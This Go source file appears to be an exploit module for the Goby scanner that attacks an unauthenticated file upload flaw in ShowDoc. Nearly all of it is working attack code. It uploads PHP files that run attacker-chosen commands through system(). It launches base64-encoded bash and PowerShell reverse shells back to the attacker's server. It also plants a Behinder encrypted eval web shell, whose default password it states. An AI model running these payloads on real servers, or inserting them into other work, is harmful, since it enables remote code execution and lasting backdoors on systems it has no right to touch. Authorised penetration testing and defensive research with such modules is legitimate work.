package exploits

import (
	"encoding/base64"
	"fmt"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
  "Name": "showDocGo",
  "Description": "",
  "Product": "",
  "Homepage": "https://gobies.org/",
  "DisclosureDate": "2021-06-21",
  "Author": "gobysec@gmail.com",
  "GobyQuery": "app=\"ShowDoc\"",
  "Level": "3",
  "Impact": "",
  "Recommandation": "",
  "References": [
    "https://gobies.org/"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "AttackType",
      "type": "select",
      "value": "goby_shell,cmd,冰蝎"
    },
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami",
      "show": "AttackType=cmd"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND"
  ],
  "ExploitSteps": null,
  "Tags": [],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/index.php?s=/home/page/uploadImg"
			randString := goutils.RandomHexString(16)
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------921378126371623762173617")
			cfg.VerifyTls = false

			cfg.Data = fmt.Sprintf("----------------------------921378126371623762173617\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"%s.<>php\"\nContent-Type: text/plain\n\n<?php echo \"%s\";unlink(__FILE__);?>\n----------------------------921378126371623762173617--", randString[:4], randString)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Public") && strings.Contains(resp.Utf8Html, "Uploads") && strings.Contains(resp.Utf8Html, "success") {
					file := regexp.MustCompile(`.*Uploads\\\/.*\\\/(.*?)\"`).FindStringSubmatch(resp.Utf8Html)
					date := regexp.MustCompile(`.*Uploads\\\/(.*?)\\\/.*`).FindStringSubmatch(resp.Utf8Html)
					deleteUrl := fmt.Sprintf("%s/Public/Uploads/%s/%s", u.FixedHostInfo, date[1], file[1])
					fmt.Println(deleteUrl)
					if resp, err := httpclient.SimpleGet(deleteUrl); err == nil {
						if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, randString) {
							return true
						}
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "cmd" {
				uri := "/index.php?s=/home/page/uploadImg"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------921378126371623762173617")
				cfg.VerifyTls = false
				randKey := goutils.RandomHexString(4)
				cmd := ss.Params["cmd"].(string)
				cfg.Data = fmt.Sprintf("----------------------------921378126371623762173617\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\"\nContent-Type: text/plain\n\n<?php @system($_GET['%s']);unlink(__FILE__);?>\n----------------------------921378126371623762173617--", randKey)
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 {
						file := regexp.MustCompile(`.*Uploads\\\/.*\\\/(.*?)\"`).FindStringSubmatch(resp.Utf8Html)
						date := regexp.MustCompile(`.*Uploads\\\/(.*?)\\\/.*`).FindStringSubmatch(resp.Utf8Html)
						cmdUrl := fmt.Sprintf("%s/Public/Uploads/%s/%s?%s=%s", expResult.HostInfo.FixedHostInfo, date[1], file[1], randKey, cmd)
						if resp, err := httpclient.SimpleGet(cmdUrl); err == nil {
							expResult.Output = resp.Utf8Html
							expResult.Success = true
						}
					}
				}
			} else if ss.Params["AttackType"].(string) == "goby_shell" {
				//反弹shell
				waitSessionCh := make(chan string)
				// 第一步，要获取到反连端口 rp
				if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					// 第二步，使用拿到的反连端口 rp 生成需要执行的命令
					// ReverseTCPByBash(rp) 返回的是 bash -i >& /dev/tcp/godserver/rp
					uri := "/index.php?s=/home/page/uploadImg"
					cfg := httpclient.NewPostRequestConfig(uri)
					cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------921378126371623762173617")
					cfg.VerifyTls = false
					winCmd := base64.StdEncoding.EncodeToString([]byte(godclient.ReverseTCPByPowershell(rp)))
					linuxCmd := base64.StdEncoding.EncodeToString([]byte(godclient.ReverseTCPByBash(rp)))
					cfg.Data = fmt.Sprintf("----------------------------921378126371623762173617\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\"\nContent-Type: text/plain\n\n<?php \n$wincmd=base64_decode(\"%s\");\n$linuxcmd=base64_decode(\"%s\");\nif (substr(php_uname(), 0, 7) == \"Windows\"){\n    pclose(popen(\"start /B \". $wincmd, \"r\")); \n}else {\n    exec($linuxcmd . \" > /dev/null &\");  \n};\nunlink(__FILE__);?>\n----------------------------921378126371623762173617--", winCmd, linuxCmd)
					if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
						if resp.StatusCode == 200 {
							file := regexp.MustCompile(`.*Uploads\\\/.*\\\/(.*?)\"`).FindStringSubmatch(resp.Utf8Html)
							date := regexp.MustCompile(`.*Uploads\\\/(.*?)\\\/.*`).FindStringSubmatch(resp.Utf8Html)
							revereUrl := fmt.Sprintf("%s/Public/Uploads/%s/%s", expResult.HostInfo.FixedHostInfo, date[1], file[1])
							go httpclient.SimpleGet(revereUrl)
							// 固定格式，等待目标反弹 shell，若 15 秒内没收到连接请求，认为执行失败
							select {
							case webConsleID := <-waitSessionCh:
								log.Println("[DEBUG] session created at:", webConsleID)
								if u, err := url.Parse(webConsleID); err == nil {
									expResult.Success = true
									expResult.OutputType = "html"
									sid := strings.Join(u.Query()["id"], "")
									expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
								}
							case <-time.After(time.Second * 15):
							}
						}
					}
				}
			} else {
				uri := "/index.php?s=/home/page/uploadImg"
				cfg := httpclient.NewPostRequestConfig(uri)
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=--------------------------921378126371623762173617")
				cfg.VerifyTls = false
				cfg.Data = "----------------------------921378126371623762173617\nContent-Disposition: form-data; name=\"editormd-image-file\"; filename=\"test.<>php\"\nContent-Type: text/plain\n\n<?php\n@error_reporting(0);\nsession_start();\n    $key=\"e45e329feb5d925b\"; \n\t$_SESSION['k']=$key;\n\tsession_write_close();\n\t$post=file_get_contents(\"php://input\");\n\tif(!extension_loaded('openssl'))\n\t{\n\t\t$t=\"base64_\".\"decode\";\n\t\t$post=$t($post.\"\");\n\t\t\n\t\tfor($i=0;$i<strlen($post);$i++) {\n    \t\t\t $post[$i] = $post[$i]^$key[$i+1&15]; \n    \t\t\t}\n\t}\n\telse\n\t{\n\t\t$post=openssl_decrypt($post, \"AES128\", $key);\n\t}\n    $arr=explode('|',$post);\n    $func=$arr[0];\n    $params=$arr[1];\n\tclass C{public function __invoke($p) {eval($p.\"\");}}\n    @call_user_func(new C(),$params);\n?>\n----------------------------921378126371623762173617--"
				if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
					if resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Public") && strings.Contains(resp.Utf8Html, "Uploads") && strings.Contains(resp.Utf8Html, "success") {
						file := regexp.MustCompile(`.*Uploads\\\/.*\\\/(.*?)\"`).FindStringSubmatch(resp.Utf8Html)
						date := regexp.MustCompile(`.*Uploads\\\/(.*?)\\\/.*`).FindStringSubmatch(resp.Utf8Html)
						behinderUrl := fmt.Sprintf("%s/Public/Uploads/%s/%s", expResult.HostInfo, date[1], file[1])
						expResult.Output = "冰蝎Url：" + behinderUrl + "\n默认密码：rebeyond"
						expResult.Success = true
					}
				}
			}
			return expResult
		},
	))
}
